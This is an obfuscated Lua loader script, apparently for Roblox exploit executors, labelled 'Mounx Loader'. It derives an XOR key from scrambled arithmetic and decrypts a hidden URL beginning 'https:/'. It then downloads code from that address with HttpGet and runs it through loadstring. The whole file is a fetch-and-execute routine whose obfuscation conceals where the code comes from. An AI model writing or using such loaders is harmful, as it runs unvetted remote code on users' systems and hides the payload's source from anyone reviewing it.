-- Mounx Loader
-- Protected by Mounx Security Layer v4
local _s,_c,_b,_x,_tc=string,string.char,string.byte,bit32.bxor,table.concat
local _g=game

-- Key derivation
local ___rgbk={}
___rgbk[1]=_c(bit32.bxor(230,0xAB))
___rgbk[5]=_c(bit32.bxor(154,0xAB))
___rgbk[8]=_c(122-15)
___rgbk[2]=_c(bit32.bxor(211,0xAB))
___rgbk[7]=_c(41+49)
___rgbk[11]=_c(63-9)
___rgbk[6]=_c(98-43)
___rgbk[3]=_c(25+30)
___rgbk[4]=_c(74-26)
___rgbk[9]=_c(62-7)
___rgbk[10]=_c(59-11)
___rgbk=_tc(___rgbk)

-- Payload
local _aivlhx={37,12,67,64,66,13,117}
local ___sgxcie={68,90,95,67,35,0,71}
local _fra={81,95,82,54,69,88,94}
local __hvwl={68,40,22,83,85,67,25}
local ___eson={57,4,90,31,87,61,17}
local _bhm={24,92,94,86,62,14,69}

-- Assemble
local _mvp={}
for _i=1,#_aivlhx do _mvp[#_mvp+1]=_aivlhx[_i] end
for _i=1,#___sgxcie do _mvp[#_mvp+1]=___sgxcie[_i] end
for _i=1,#_fra do _mvp[#_mvp+1]=_fra[_i] end
for _i=1,#__hvwl do _mvp[#_mvp+1]=__hvwl[_i] end
for _i=1,#___eson do _mvp[#_mvp+1]=___eson[_i] end
for _i=1,#_bhm do _mvp[#_mvp+1]=_bhm[_i] end

-- Decrypt
local __nqj={}
for _i=1,#_mvp do
    __nqj[_i]=_c(_x(_mvp[_i],_b(___rgbk,((_i-1)%#___rgbk)+1)))
end
__nqj=_tc(__nqj)

-- Execute
local _nhd=_g["HttpGet"](_g,__nqj)
if type(_nhd)=="string" and #_nhd>0 then
    local __otkwms=(loadstring or load)(_nhd)
    if __otkwms then __otkwms() end
end
